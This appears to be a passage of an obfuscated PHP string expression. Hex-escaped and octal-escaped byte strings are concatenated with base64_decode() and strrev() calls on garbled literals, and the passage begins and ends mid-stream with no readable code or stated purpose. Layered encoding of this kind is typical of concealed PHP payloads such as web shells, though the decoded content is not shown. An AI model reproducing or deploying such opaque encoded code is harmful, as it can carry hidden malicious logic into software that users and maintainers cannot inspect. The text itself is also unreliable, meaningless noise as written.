3\x4c\x6e\x51\x30\x87\x4a\xc3\x1a\xc\xe6"."\xd4\x29\xb3\x58\xe3\x21\xef\x60\xde\xb0\x72\x23\x6c\x28\xa6\x41\x13\xb3\x29\xab\xb4\x6a\x90\x71\x7e\x9a\x6e\x67\x56\x43\x75\x53\xd9\x80\xce\x9c\xe\x55\x65\x8b\xc6\x80\x3d\xa\x37\xcf\xb3\xa7"."\x41\x63\x4a\xf9\xe2\xc0\xa0\x3\x6d\x9d\xc6\xa6\xcd\x59\x9d\x29\x59\xfc\xa6\x2d\x6b\xc\xd\xae\x2\x29\x77\xc9\x31\x33\x3\xc3\x1a\xcb\x66\x64\xcd\x11\x26\xc7\x5c\x9d\xee\x1f\xcc\x82\x7c\x67"."\xea\x6c\x68\xe1\x60\x71\x64\x95\x9d\x87\x81\x61\x9d\x99\x31\xd\xf6\xf6\x74\xb6\xd0\x9d\xa1\xc2\xa8\x99\x2a\xb2\xc2\x2c\xb9\x1e\x2\x83\xf6\xaa\x31\x6b\x38\xcb\x56\xf\x1b\x9c\xd9\xd0\xc7\x5c".base64_decode('3tCzJSapGBsxcnmQSs5hOC49kDP1EuzNaVNgW82YCYEVeehss5YaYmJWxHo6JduT')."\201\133\314\24\2\171\255\300\125\133\332\101\17\43\45\153\131\313\31\206\164\235\151\352\62\15\140\241\73\141\227\210\215\2\300\215\274\56\344\305\351\176\301\37\143\201\203\244".base64_decode('cYGjCblkquBIySjmSk04psV1PKj2WAC3KuDuZz2sgQrXfyD9tO0R04LhGDLTqZxZ')."\112\273\152\115\367\273\352\344\120\306\320\173\123\6\306\201\243\172\134\12\262\14\346\32\240\176\62\143\252\34\11\260\41\356\227\146\223\12\256\35\315\36\12\310\140\277\234\152"."\x14\x50\x2b\x72\xb9\x80\xdb\xc8\x4f\x25\x7f\x60\xc\xa8\x21\x99\xad\xaf\x2a\xe9\x5\x71\x75\x6c\xf\x49\x3\x8f\xad\xf3\xba\xbb\xd4\x64\x28\xb1\x58\x52\xb1\xc3\xd6\x63\x6c\x9\xa9\x42\x17\x5a".strrev('×vºo·Ãîú(eË}³İ7;%Åÿm6ì¸ï—…ûy½ŞvhîÀCİyGA¨–ê').base64_decode('VWe9+/CGdx8+bec5P9/96PrtF96984dbtl9z+/abz3l385adj5/z3u0XvPvwXTuu')."\71\157\373\131\17\276\273\371\362\355\347\136\277\375\234\13\167\134\262\341\335\55\327\240\374\73\316\25\65\243\154\333\357\272\22\227\175\364\214\355\17\77\274\363\206\333\171\352"."\356\107\117\7\104\10\233\164\241\356\140\243\73\246\67\105\106\107\231\257\300\202\324\355\200\322\225\323\321\10\53\251\254\236\32\302\112\126\116\126\267\24\207\50\133\151\350\157"."\301\54\370\351\202\243\6\215\266\142\24\160\262\302\346\46\300\27\145\122\317\27\361\322\202\121\12\122\243\47\227\326\265\264\376\52\15\63\115\250\260\254\360\130\213\271\252\301".strrev('uéé´“'."\r".''."\n".'ÂBÚ…Ã6¦Á›ÊÓŠ‚l÷IñÎLqAvÌ)Š€2ƒt€C@e5òÂ÷¸A').strrev('tœÅéo›“òÛwg‡¾…·knBŸÚûÛÜ”€H÷$äLÍû\\Ê»"’ÙF')."\x13\x53\x1c\xab\x38\x88\x72\x6b\xe4\xab\x62\x4f\xd7\x12\x15\x86\x91\x77\xce\x95\x88\xf6\x75\xc9\xa9\x90\x51\x1e\x6d\xd7\xd5\xa9\xd9\x92\x43\x88\x4e\x5c\x1f\x92\x9b\x74\xd1\xd\x1a\x15\xa2\x5e"."\364\41\216\47\55\75\155\60\345\140\75\117\162\62\205\173\42\140\346\132\311\51\264\5\54\327\75\321\274\246\142\266\210\355\243\235\271\115\140\207\11\367\156\252\364\135\10\13"."\343\17\31\232\363\336\75\361\15\323\332\54\131\51\343\154\15\176\277\137\222\257\12\165\60\34\202\352\304\5\55\202\205\361\156\36\17\336\312\365\32\320\66\317\144\164\333\151"."\40\326\123\312\144\5\65\164\166\140\12\12\220\15\61\43\60\13\5\311\50\301\46\356\205\221\53\331\314\244\141\122\140\72\30\324\330\163\101\51\143\56\301\45\215\122\363\1".base64_decode('LkqVCjkGRUGUJV4q4BlucPdZL6SlQnO1lCPVqjISMSDGQ5ss0vX08TAx0iiNQAZW').base64_decode('tsM976j/fr4U0PQiEiFtE2VSOHGgSlsyLI2LVYSLk+H6mqKOPOVFRIYUuBapndPY')."\355\236\215\150\23\243\240\363\365\127\262\205\52\275\46\60\10\16\211\255\115\123\260\215\135\4\346\11\153\147\253\350\334\267\245\374\152\106\167\124\40\177\154\166\20\46\42\55"."\x6a\x57\x88\x99\x5c\x68\xc5\x62\xd0\x4e\xf\xd9\x41\xac\x10\x69\xc\xeb\x51\xa3\x3f\x88\x8d\x58\xf1\xa\xd\x70\x33\x4f\x72\x22\xa8\x5a\xbf\x69\x39\xd2\xbe\x51\xd3\x8c\x5a\x8f\x46\x9a\xd5\xd6"."\110\134\372\162\261\344\375\262\354\125\40\324\25\121\23\211\230\324\16\142\123\267\134\135\34\153\125\133\142\261\305\21\330\22\260\10\32\44\254\215\255\261\304\315\62\216\11\253".base64_decode('LHwZI2uhyWQRNvvGR39CAV1OtPda2kNxrkE/I1AfmCLyog+q2JCgkZmYJpKheAXj')."\177\352\24\0\26\10\70\2\200\2\355\261\145\112\113\54\332\335\321\231\240\66\357\24\336\31\223\322\211\236\64\44\63\327\0\345\311\120\175\270\53\32\152\11\53\221\316\144".base64_decode('jBlCcFVVYgKT4HE2BJatc9N/KE8jspmOXCOvCbZUj6+6t6q3rremt3ZloNfuC0rn').base64_decode('qCFPj8F3Oddq6WqFrjbwUNqGNdWRSCwBG69YPNQSZc1CKxSCsZYIDbx36b3v/mLj')."\173\127\157\332\176\336\6\124\321\216\37\237\261\343\212\7\21\11\205\311\246\115\353\337\173\154\343\216\113\357\336\261\36\310\35\145\347\335\17\275\273\345\361\367\56\275\175\373"."\xa6\x2b\x77\x5c\xfe\xc8\x7b\x3f\x3e\x93\x26\xec\xba\xe3\xde\xed\xe7\xdf\xce\x1b\xa6\xec\xba\xe4\xb1\x1d\x1b\x6f\xe1\xa4\x14\xa5\xa0\x7c\xa8\xf4\xae\xb3\x36\xbc\xb7\x65\x13\x26\xa4\x6e\x3a\x6d"."\307\3\27\354\270\146\303\366\363\157\330\176\325\355\357\155\274\173\373\215\77\334\176\366\206\235\167\137\166\274\167\121\321\170\17\233\26\60\223\14\236\334\153\327\325\320\241\356"."\265\47\343\141\256\105\277\65\330\306\2\375\62\125\161\242\76\274\244\73\334\331\22\366\332\54\311\121\360\241\120\107\127\13\325\170\1\252\327\6\37\14\54\116\114\261\33\253".base64_decode('x23FWlgLUqOkxrSGEy3xSHMYtPj5RE0idB+oOyBoIr6Uh7mZXpnPC6WGLexaxdUR').base64_decode('LZAyc6V8gTRWqcIKHlU+jHmIAZVShc92BNBTaBvWYEN5ovdbvaLaV++bUquAQwxa')."\x2\xdc\x60\x28\x55\xa0\x4c\xce\xcb\xb9\x3e\xe2\xeb\x77\xc5\xa6\xf8\xea\x6b\x95\xaa\xe2\x50\x15\xb4\x4b\x8c\x2b\x6a\xbd\x4a\x73\xda\x8a\xe6\xab\x81\x6\xcb\xcd\x15\x79\x11\x66\xb3\x1d\x4b\x33".strrev('°~•k«šl÷áÀTÊÅUtb=IÎêÙÔ%0¼9ByĞJ *EµË¯Ñåâ>RSª').base64_decode('qJBIirkGo9E1GDWTAWd0LeTzTQ0fFGoXR5ul2WyiAEqmCkPpbLG8JuoGmhyaHwV4').base64_decode('CjYR4DUh1MQT2AxiOJ/ECmnEVUkVpU1pP/N2hqE9cJHRsYL3ga1lhRFJ3NEJtvAL')."\x27\x5b\xda\xe9\x2a\x4f\x48\xcb\x3c\xdd\x3f\xc9\xb5\x50\xc5\x70\x2a\xae\x25\xc2\x19\x1c\xc8\x47\xb7\xb\x46\x8\x13\x48\xbe\x48\x67\x5b\x2c\xde\x41\x2d\xdb\x12\x2d\xed\xe1\x8e\x50\x0\x10\x3a"."\135\11\64\77\246\0\225\106\245\32\143\76\12\252\166\15\77\371\20\33\262\44\371\52\332\127\252\203\310\71\72\12\305\14\64\6\146\137\41\326\313\32\51\322\130\115\235\13"."\x40\x95\xdc\x23\x4f\x2c\x9e\x54\xd1\x0\x0\x7a\x96\xb0\x6e\xb5\x74\x72\x48\x3a\xe1\xd8\x40\x6b\x98\x71\x26\x3\x88\x3e\x33\x99\x4f\x85\x74\x3f\x73\xdc\x83\x2a\xc7\x75\xb6\xc4\x3a\xdb\x22\xcc".strrev('\\àØ~Gøâ"ùø’aaæ’8¤P+”"(“¦IUa_|:õ°GjetÚbşø¯ˆ').strrev('‡wgj!F£cq—Æ¡â„Š\\X„âà[¸yZË¾À¡‚°E\'Dıü!‡’')."\xc0\xf8\xd1\xd0\x52\xb4\x58\x62\x82\x58\x61\xd8\xba\x26\x50\xd7\x54\xdb\x4b\xed\xec\x68\x90\xfe\x2c\x60\x31\x6c\x7b\xd4\xb7\x66\x8a\x4f\x99\xb9\xae\x16\xf2\x30\xcb\x34\xd5\xc9\xa2\xe3\x57\x15".base64_decode('X1kSVaOxhTROPB+FC2nBJSk9CiLIk4Igt9nRxXeDgtawQo13lc7YspBwpiMlAET4')."\326\11\236\334\323\73\322\33\100\204\203\275\122\330\315\265\66\53\214\44\151\41\122\6\52\214\200\322\41\166\214\256\364\301\211\241\346\314\14\163\214\201\20\42\43\27\350\357"."\x72\x16\x20\xb8\x12\xa\x20\xd6\xbb\x98\x63\x6\x74\xd4\x72\x4f\xed\x5d\xdb\x7b\x62\xaf\x3f\x40\x8d\x15\x31\x21\xd3\xeb\x13\x4d\x52\xc3\xcb\xd1\x19\x9b\x48\xb8\x2c\x2d\x55\xe2\x2f\x6\x6a\x47"."\xbd\x84\x10\xdd\xb5\x34\x32\xf\x7e\x80\x27\x9c\x7\xa4\x2a\x44\xe7\x37\xf2\xc9\xc\x2f\x59\xdb\x89\xfe\x2e\x4c\xae\xd\xa3\xbf\x51\xf4\x13\x4d\xa2\xe9\x32\x78\x6\xb4\x25\xa3\x91\xc5\xe1\xb5"."\370\37\221\120\313\7\222\332\44\271\13\104\72\327\242\177\21\202\131\33\351\364\126\326\34\116\56\13\207\151\6\26\206\137\221\25\41\34\350\252\344\31\13\53\375\103\262\60"."\x2\x80\xaa\x55\xb5\x86\xc\xa6\xbf\x6f\x72\xad\xaa\x6\xed\x6e\x58\x2f\xdc\x57\x41\x4d\xf5\xc4\x29\xd5\x70\x86\x84\x12\x2d\x2\xfb\xba\x16\x44\xf9\x5a\x20\x2a\xfa\xee\x85\xc0\xfd\x3d\x41\x7c"."\141\74\326\335\45\305\333\103\113\43\235\13\131\54\130\307\102\165\120\265\322\32\111\240\41\152\141\213\121\270\241\222\343\100\160\22\262\110\246\200\135\113\272\25\141\166\24\221"."\310\167\314\30\120\314\354\336\145\315\335\221\150\253\154\134\216\63\302\201\102\260\72\234\51\223\130\343\130\234\230\231\263\10\36\162\26\46\313\215\105\310\30\260\10\35\0\26"."\43\303\305\42\304\335\25\213\220\216\262\10\346\124\302\235\54\15\361\256\210\357\144\14\151\126\33\346\326\221\163\323\375\222\47\3\214\203\3\124\176\207\335\131\40\216\116\343"."\x52\x56\x8f\x88\x96\x48\xcb\x24\x81\x4\x55\xc4\x53\x24\x23\xed\x20\x5\x21\x6a\x93\x0\xd1\x6f\xef\xca\x26\x42\xd\xaf\x64\xb\x93\x5a\x2\x3b\x49\xc3\xc9\xb9\xbe\x2\x16\x83\xe8\x2b\x11\x62"."\xa6\x29\x7d\x87\x99\x49\x10\xd9\xa4\x6a\x4a\xf2\x71\x72\x50\xcb\x0\x21\xd\xa3\xc2\x74\x10\x3c\xb\xa1\x12\x56\x40\x24\x22\x69\x1a\x75\xb3\x53\x1c\x2f\xad\xe4\x5c\x12\x78\x57\xf0\xc1\x2f\xb4".base64_decode('6GD60wtRJkwB05dqHxyyzFzCzSn39laNN1qQgY0ZRKtolJUy+JmXymKPGKqTZ8J4')."\302\250\11\261\67\25\235\213\170\153\74\326\105\51\20\45\322\246\120\177\13\112\65\25\266\127\3\151\325\22\17\343\335\101\163\261\264\232\152\227\230\154\176\265\2\306\327\265"."\xee\x52\x91\xce\xd6\xf0\x72\xa5\xda\x48\x8f\xaa\x9a\xa6\x42\x61\x5\xed\x45\x56\x91\x52\x56\x13\xab\x81\xb6\x15\xae\x97\xec\xac\x39\xa2\xc8\xcb\x8b\xf1\xce\x2d\x14\x96\x14\x4b\xae\x8c\x34\x23"."\236\23\230\241\253\17\30\164\236\102\51\142\232\24\111\240\3\73\32\45\75\105\111\206\215\11\131\237\302\35\34\140\40\146\76\250\370\25\52\142\11\264\42\232\24\136\236\214"."\207\60\220\120\237\7\114\100\177\10\102\301\334\221\225\327\250\365\47\241\331\2\53\101\140\260\322\105\42\122\342\21\23\211\260\202\310\221\47\365\211\247\20\251\1\35\146\131".base64_decode('prAYqG4a64pHOkLxFTBkggeAHWjmXDbAImLY3ZIVeidqtWyVTueYY1jEzzIMi1oD')."\33\0\317\74\20\74\324\73\241\312\215\214\231\100\245\206\31\353\372\130\200\71\173\40\106\115\114\202\226\107\50\207\307\304\254\301\332\207\131\221\123\145\263\54\341\76\21\37"."\222\170\222\31\266\157\13\165\107\145\10\14\225\262\70\274\342\153\366\10\153\151\245\75\302\322\230\150\206\357\66\350\117\315\14\350\37\365\77\121\63\25\361\244\245\202\155\144"."\12\334\171\33\264\12\316\326\356\144\114\105\347\107\74\214\261\71\364\210\17\253\324\136\211\357\226\47\5\252\301\31\270\57\312\257\351\32\313\123\251\153\274\74\227\102\205\73".base64_decode('F0Y6w40dY5FEqENhDQc5G3bZNhvqicTUKKKJVVmUFomB8DnQLzsfUYUPk4AmlLId').strrev('u]‘\\ÊT¦g8'."\r".'˜g»qï(+–—©ZIÈ€»á!Z6Æˆ&­Áİ¢L4¹$«')."\x7d\xdc\xab\x1d\x2d\x83\x85\xa2\x36\xbf\xc5\x61\xfa\xe1\x8\xad\xe5\x5d\x5\xba\x25\xdf\x3\x5a\x5a\xd2\xc9\x56\xd8\x97\xc9\xf5\x52\xc1\xdd\x4e\x74\x70\xe6\x54\xec\x6\x4\xf1\x85\xaa\x2e\xba"."\225\327\155\233\137\62\23\56\210\5\235\254\360\301\40\273\77\154\155\146\103\130\52\70\11\75\7\142\377\326\176\242\342\56\214\326\204\271\217\244\372\116\156\154\304\274\120\107"."\224\236\202\120\123\204\167\134\312\45\200\121\341\357\20\137\226\210\72\373\30\57\57\72\271\332\140\107\234\367\252\221\67\262\140\166\351\126\336\40\267\102\313\204\235\15\117\327".strrev('@œœ'."\r".'Ãù Y±¤ky€¸É@& ú›/ËµR%=¯Š3'."\n".'8‡H/¤Sı€iP•å')."\330\257\305\122\2\302\307\14\251\23\23\61\176\341\363\41\255\311\66\230\222\227\337\343\345\31\47\123\47\126\340\200\41\73\200\10\10\327\217\174\121\57\340\3\216\155\223\341"."\xae\x1e\x13\xc4\x3\xaa\xd4\x96\x2e\x9e\x3f\xc5\x7d\xfc\xd2\xd1\x90\x86\x99\x0\x68\x90\x6c\x43\xa5\x41\x34\xa2\x1d\xb5\xd4\xb4\xc6\xa4\x35\x20\x41\x3b\x98\x5b\x24\x70\x3c\x19\x35\x33\x1c\x83"."\40\72\21\234\177\271\260\110\44\6\145\3\72\66\72\242\206\37\330\60\214\27\244\216\257\276\271\120\267\344\173\163\234\215\137\261\134\13\144\344\37\264\210\120\347\233\77\30"."\327\305\331\214\212\21\33\257\157\54\44\20\41\371\22\51\44\41\117\117\31\262\34\251\205\12\314\174\26\222\305\32\103\30\273\63\246\266\243\103\41\306\110\7\303\116\272\220"."\x30\x2b\x5\xa8\xc0\x41\x94\x4d\x2a\x48\xac\x6a\x81\x31\x9b\x4b\x6e\x92\xe8\xd\x27\x4c\xf6\x1a\x84\x5f\x79\x88\xe9\x74\x80\x97\x2d\x71\x64\x87\xe8\xcf\x8a\x7c\xda\x8f\x1a\xe\xab\x2e\xad\x3b"."\xdc\xbb\x11\xc6\x66\xcc\xc0\x10\xb7\x59\xb2\x49\xce\x73\xec\x37\x22\xb9\x13\xd4\x86\x75\x6c\xd2\xc5\xc4\x1e\x65\xaa\x35\xd0\x95\xf2\xce\x41\x13\xf1\x55\x55\x22\xd6\x1d\x67\xf7\x29\x38\x4e\x8c"."\123\343\341\226\25\374\72\203\103\333\102\113\275\220\10\226\375\205\26\126\4\163\211\24\206\23\326\117\215\307\260\350\56\34\155\363\24\110\264\163\357\217\156\230\32\215\164\56"."\xae\x98\x80\x8\x88\xe\xa9\x8\x5\x46\x92\xe1\xe\x2f\xcc\x5d\x43\x22\x1c\x8a\x33\xb7\xa1\x38\xde\x1c\x8d\xb5\x48\xc9\x91\x58\xf9\x48\x70\xa\x85\x3\xa9\xe0\x8f\x2\x83\x27\xd7\xf4\xae\x21"."\274\113\3\142\141\322\153\261\204\300\257\366\115\256\155\352\135\127\133\323\33\154\12\324\161\301\26\105\127\222\31\353\70\140\233\35\42\15\136\0\76\177\30\220\26\203\130\60"."\x10\x80\x8f\xf0\x40\xb0\x37\xc8\x5d\x68\xb1\x3\x2\x5c\xf2\x26\xa8\xb3\x21\x57\x2b\x3c\x5e\x38\x98\x79\x7b\xc0\xeb\x6d\x52\xc5\x86\xb1\x2a\xdf\x4f\xf8\xfe\x53\x4d\xac\x48\xf0\x91\xa7\xcb\xb0"."\122\272\153\255\321\154\262\162\204\47\63\372\333\45\147\305\372\70\25\63\272\26\253\313\60\130\6\5\14\123\354\3\261\141\323\146\252\204\175\33\211\321\27\146\304\10\24\160"."\125\201\120\365\220\140\263\141\277\45\330\276\54\240\123\20\216\331\26\104\65\56\154\217\54\132\34\355\350\214\165\55\211\47\222\335\113\227\55\137\161\22\214\64\133\16\3\212"."\x9f\xb9\x26\x3\x9f\x96\xc1\x61\xcd\xa\xe\x33\x5f\xcc\x4b\x31\xd1\xaf\xdb\x41\x99\x98\xe2\x40\xd4\x47\x84\xea\x18\xa2\xa\x52\x59\x0\x4f\xc5\x78\x21\x58\x39\x89\xd6\x16\xcc\x17\x9c\x29\xe3"."\344\350\262\364\176\323\164\306\111\135\332\361\365\25\103\142\117\257\335\307\326\137\60\255\17\103\120\50\300\331\202\325\1\362\301\57\373\204\306\113\125\246\350\322\375\236\163\36".strrev(''."\0".'Gq'."\r".'JVñ¥ MòCi2™òK'."\r".'®|IïeqØ…É½ÓûÏá\\<Ó*p¢Vªâ'."\0".'')."\363\333\376\21\203\255\246\211\234\377\3\5\54\125\113\121\176\130\122\76\134\345\307\354\220\137\313\145\114\104\270\145\363\14\252\15\271\322\205\117\322\242\231\63\230\63\271\125"."\176\364\11\51\215\146\106\225\263\363\23\253\116\160\177\256\70\142\363\230\274\305\310\11\303\365\204\360\71\326\356\331\335\34\310\275\315\46\110\47\32\224\351\340\222\271\15\121"."\xd4\x92\xc1\x26\x73\x8a\x2b\x28\x2e\x4c\xa5\x11\x2f\xc4\x34\xea\x53\x84\x33\x77\x26\x2f\xa5\x4c\xc8\xf1\x9e\xd\x47\x7c\xd8\x8\x32\x3c\x25\x3b\x2e\x60\x88\x39\x3f\x24\xf4\x49\xf2\x43\x5c\x7b".base64_decode('I+UiTDANIGKWRHuAX3WU1jzGtL/A6LN5LC49C+HyICF7og8tS0z3t3eEWvzoeJk6')."\143\46\77\324\173\223\350\124\147\13\113\33\261\247\63\106\206\102\46\317\124\262\46\323\46\236\130\356\333\165\242\333\317\61\5\122\147\245\51\113\117\143\15\33\106\105\122\250"."\147\45\121\240\300\23\64\116\235\340\61\155\265\254\306\33\214\273\1\270\252\302\167\227\127\374\356\362\112\337\135\356\371\356\362\362\357\122\220\147\305\152\305\142\113\26\257\5".base64_decode('FzZ1gVJyhJ1qA1hHSNZDAtEqVUMOoORWSlCneX5bhPiuGJD2i6u6AKD8NDtEbYbE')."\162\232\355\54\165\371\62\372\106\17\303\330\13\107\7\147\36\70\335\32\64\155\73\210\375\57\22\152\235\353\333\305\22\354\362\310\335\47\252\166\44\161\371\340\2\216\273\307".base64_decode('5c5zhYddKvOn4TB3RYOYjlAGOxdBeA5GJTxaNG1ddt2c1ok/UG5NL/lBzmujGBMx').base64_decode('NUTJIzLzLyw7Y8QD5s+7PLiP+lHXPT6FbV0fYsqSEgPCpQ1d3FewtzsYFQikaHE/')."\321\364\272\330\137\21\340\227\374\123\120\154\40\371\32\107\355\202\252\161\63\141\377\146\311\330\60\11\5\375\71\251\122\257\375\226\160\336\214\346\222\276\20\260\130\37\143\216"."\221\75\73\300\343\113\271\167\141\157\107\157\122\36\46\307\322\6\6\120\263\45\367\254\256\266\10\327\315\260\374\210\123\177\66\30\343\73\176\206\133\221\23\53\372\215\206\104"."\xc2\x71\x4\x2d\xa2\xaf\xe7\x1b\xe1\xe4\x5e\x90\xbc\xe\x52\x61\xed\x2e\xc1\x70\x58\xbd\x3\x42\xc9\xaf\x58\x92\x1e\xa8\x91\xd7\xb\x3e\xc6\xb9\x56\x1d\x96\x54\x50\x77\xdb\xc\x65\x10\x37\xd8".strrev('¬ÄÜ Hk'."\r".'U¤ˆ³ÇU	…WÊ¶·è5‰ª†ªÄ­'."\n".'¦¸™ÃLÙ¡]'."\r".'õ‘¿fà')."\x6\xe3\xc\xc9\x13\xad\xb8\x8a\x7\x29\x5b\x13\x1a\x5a\xe9\xfe\xa8\x89\x8c\x6\xde\xfb\x53\x83\x53\x83\x23\x80\xf\x9a\x56\xe1\x2f\x8a\xb7\x32\xbc\x67\xc0\xa8\x8a\xd0\x1e\xbb\x17\x51\x65\xe4"."\xb\x68\x1d\x46\x5d\x4e\x69\xe7\x2d\x61\x68\xb9\xa3\x75\x6\xc3\xa2\xa1\x8e\x93\xfc\xc2\x37\xf4\xbc\xa6\xd1\x7c\x4e\x1\x2e\xb3\xb1\x7a\x4a\xa0\xbe\x5a\x61\x6f\xa9\x34\x56\x77\x27\xdb\xfc\xb3".strrev('ƒ |¨a£ ,Ú¶¼¿¬,¯ĞHñ{xyÛ‡ÏüÊ2Æ¾z;&Ü…¯0æ›«').base64_decode('2c2xmHDXXdCdEdOCq3JAsFOZGU5Wwj15m21tInBqwAJS1v3u4lip4MciCH9C9hvo')."\x79\x20\xa0\xde\x9d\x1f\xb\x11\xdc\xf9\x65\xd4\x98\x12\xe8\x23\x2f\x82\xf4\xb1\x87\x6\x45\x7e\x1\x44\x72\x86\x4c\x4\x54\x74\x57\x32\xad\xf\x80\x61\xac\xc9\x40\x2\x83\xe\x8\x2b\x2\x8c"."\22\125\67\112\134\340\151\57\36\152\77\42\272\360\372\107\233\12\35\277\216\136\51\213\373\231\11\357\343\23\336\121\40\105\360\344\372\345\127\55\106\21\305\215\223\261\177\173"."\77\236\137\277\221\36\57\105\154\352\212\115\115\301\122\251\224\245\273\144\244\275\237\44\332\11\376\122\211\175\260\142\245\62\77\300\62\220\116\104\170\175\56\312\134\103\163\315"."\x89\x71\x2f\x71\x2f\x9\xa4\xcb\x7d\xc6\xa3\xcd\xab\x4c\x9d\xd6\x30\x63\xe\xfa\x1f\xd0\x23\x53\xae\x28\x15\x99\x22\x37\xa\x32\x9f\xf2\xc7\x7\x7\x18\x1e\x10\xef\x4e\xb0\xbe\xe1\x9\x97\x9c"."\360\273\300\142\30\371\16\147\10\304\225\117\264\326\365\242\11\164\224\362\357\322\143\1\104\162\116\167\22\126\71\122\371\343\12\25\60\51\142\306\330\201\1\307\256\244\357\312"."\47\44\303\2\26\317\257\211\55\322\237\33\22\75\351\307\72\353\260\302\207\120\103\115\101\146\221\43\127\26\113\147\113\205\241\106\51\121\161\114\123\311\153\205\61\340\6\46"."\331\15\223\354\271\370\103\215\130\133\337\106\21\300\327\334\225\56\76\107\204\343\103\352\210\7\122\350\75\101\0\277\204\22\300\207\124\274\4\271\272\162\45\376\152\105\221\204"."\241\205\135\321\356\205\221\116\111\63\112\2\250\55\255\235\152\250\253\253\142\2\47\130\260\200\20\253\25\4\6\331\155\113\212\255\252\171\106\76\243\244\260\311\107\143\25\206"."\126\51\266\225\142\16\205\253\202\200\107\111\6\301\77\315\63\240\110\65\56\242\14\240\145\342\47\41\232\134\75\177\136\320\230\317\7\133\270\75\262\114\141\321\22\10\236\200"."\271\251\40\326\75\52\234\210\147\127\126\205\40\320\66\341\344\110\121\346\151\12\35\307\306\152\42\7\257\126\262\350\74\346\212\227\363\275\205\73\331\175\324\274\240\46\47\342".base64_decode('nRU3GfnLmSgsZveA5KuMkOR+nLxC0aIVlpYXwZUHUnISnUlic1OeP0gkAUHBL7rv')."\172\370\325\110\205\105\121\324\122\103\170\35\11\244\17\137\202\204\56\314\230\320\4\327\143\12\216\244\361\121\302\126\147\104\264\156\211\27\137\326\254\241\25\341\163\176\335\272"."\162\30\50\215\172\223\102\105\303\13\302\353\305\13\303\214\266\200\241\323\313\375\31\272\126\345\114\2\302\362\320\137\121\46\332\271\120\104\50\43\342\112\354\141\372\331\44\326"."\xdb\x53\x1d\xa8\x5b\xb7\x2e\x68\x30\xd5\x2a\xa6\x6\xc2\xca\x6\x78\x6e\x1a\xef\xd\xb8\xf3\xa3\x9e\xc0\xd0\xf3\x8c\x0\xf0\xe6\xa4\x54\xe3\x22\xd8\x72\x7\x4\xeb\x84\xa5\x1c\x57\xa1\x52\xb0".base64_decode('XlVj4/wefnHUx9IY6WdMmc0mfXXWn1zGgy2dgrjlS5tikQARkoTcDoebhvlbJnRU')."\345\160\250\130\224\243\354\201\36\162\253\220\63\372\203\174\217\323\233\206\100\112\30\230\261\54\4\303\170\340\130\377\311\223\200\215\141\10\170\30\241\100\104\153\15\172\341\250"."\56\16\344\201\171\166\312\62\212\216\13\73\321\347\13\253\310\133\63\203\332\260\106\263\124\51\300\225\67\126\21\137\373\125\10\33\321\24\100\3\242\51\363\60\332\121\54\75"."\xd7\x58\x45\x9a\x6b\x67\x75\x1d\x95\x27\x88\xa5\xd2\x47\x50\xc1\x2a\x85\xe1\xc4\xbc\xc6\x47\xcc\x72\x4c\x74\xdc\x71\x3\x26\x78\xf9\xa9\x3b\xe\x96\x15\xa1\x4e\xb8\xc9\x39\xe1\x64\xfa\x3b\xf1"."\x4\xb6\x42\xc8\xfb\x63\x39\xdd\xa2\x7a\xe3\x4\xc9\x90\x3b\xc4\x1\x21\xc2\x82\x17\xa8\xba\xe2\xb1\x64\xac\x85\x3d\xd8\x53\x49\xd6\xc5\xad\xc6\x6d\x6a\x94\x27\xd8\x1a\x66\x9\xc4\xd5\x2b\x58"."\16\116\0\4\1\2\363\156\225\12\5\256\251\206\51\102\176\112\141\315\27\165\121\42\326\311\36\70\111\362\145\203\315\226\2\112\217\306\356\234\100\305\225\136\242\45\262\45".base64_decode('R5yI2Gt/Elsk2wCWfBRiD4mooh4qmmysZ0YeTAFOWKdBzgp1ULFvkiuY6QWXxIN+').base64_decode('O2cyt41T6+vr/fVT0P9MRZq5j2uory/LUl/fQP6nCURoC5PiTkGbn2EtyDCi69Ag').strrev('n;²Ã0¶·àAŞéˆEË«›õ‰\\ÈÈ¦ñÍµº1õ¦à¦Wl¨ˆÄ¡Fò8').base64_decode('Fka0DJptMijQXm7SiLKJdTSXWpA28kaFC+ke+WMBNrgUKFxI+1mCX37yAQrRo0Fc').base64_decode('W7iahsq43TRiCDqYU7yfGCBJSDBhJrmexFH5doIkc7tAEstxFwU42slroi+LUIs8').base64_decode('GMMKyzVrjqjiFMbRRTxGhhSzSGwZpiXbTTyuDB9L2blUSagWgKYEseEfMnIuy2VV')."\52\52\217\355\134\234\221\365\44\351\56\211\53\102\73\72\304\337\127\241\52\214\254\155\12\154\75\40\37\360\11\102\236\306\243\132\247\15\7\224\115\256\343\235\130\62\107\226".base64_decode('KcyQyxSHWEyaKSYhT3yDbg+DhBmAasO0cK+NUgXeJE+ZEBWslxUAeHluchlRITeG').base64_decode('e3ITf40t3Oms7MSRagpI2ik2ONYXqgGsjmGJewoULTODZt2WBw3BuyqDefbynBUy')."\xf1\xd6\xcb\xf9\x64\x20\xbe\xe9\x60\xf\x54\xc2\x72\x16\xa6\xd0\x9a\x78\x1f\x57\xca\x9a\xe0\xfc\x97\x4\x74\xef\x66\x29\xa1\x85\x3f\x83\x24\x3\x31\x37\x26\x2b\x83\x10\x5d\x5e\x77\x1d\x98\xcd"."\163\103\170\313\276\146\321\61\366\334\201\307\114\145\115\106\232\115\140\44\54\72\221\5\274\252\153\231\260\265\312\164\117\360\10\211\273\140\67\234\302\50\3\355\272\76\112\22".base64_decode('RJfT2duqgArJpsIVEB0dz6CKjQBbt7FRLuZOe/vsi1jgEpYLDyuX/8mCcTykqizb')."\300\73\272\235\77\351\131\141\41\272\27\133\331\252\42\364\1\256\240\201\243\102\51\206\153\7\104\346\103\114\236\115\305\160\76\14\126\350\73\227\112\101\347\6\350\356\111\225"."\xb\xc0\x63\x44\x26\xa2\xa7\xb0\xb\x58\xb9\x10\xae\xab\xdb\x83\xa2\x16\xbb\x30\x22\x6f\x6b\xf\x69\x2c\xd3\x7f\x53\x26\x5\xa6\x82\x6e\xde\x24\xf6\xba\x0\xc5\xc7\xe2\xa2\x37\x8\xdd\xee\x41".base64_decode('3epDRL04TWBCeig2ZnXiJkMozeZnVUlnlLp0TihSJYC2k1nLdDgXh9NDaensi8rk')."\x5a\x92\x16\xf1\xcf\x17\xdf\x71\xdd\x1b\x4a\xbe\xb2\x79\x56\x74\xae\xb3\xaf\x6b\xec\xac\x27\x4a\x64\xc4\xd7\xb8\xc4\x58\x7a\xa2\x5e\x95\x3b\x72\x2e\x3b\xec\x68\x65\xce\xc7\x85\x36\x1a\x9e\xc6"."\x84\xa4\xa3\x54\xe1\xb\x50\x88\x17\x1\x82\xc1\xd2\x53\xa6\x45\xe4\xa\x92\x9f\x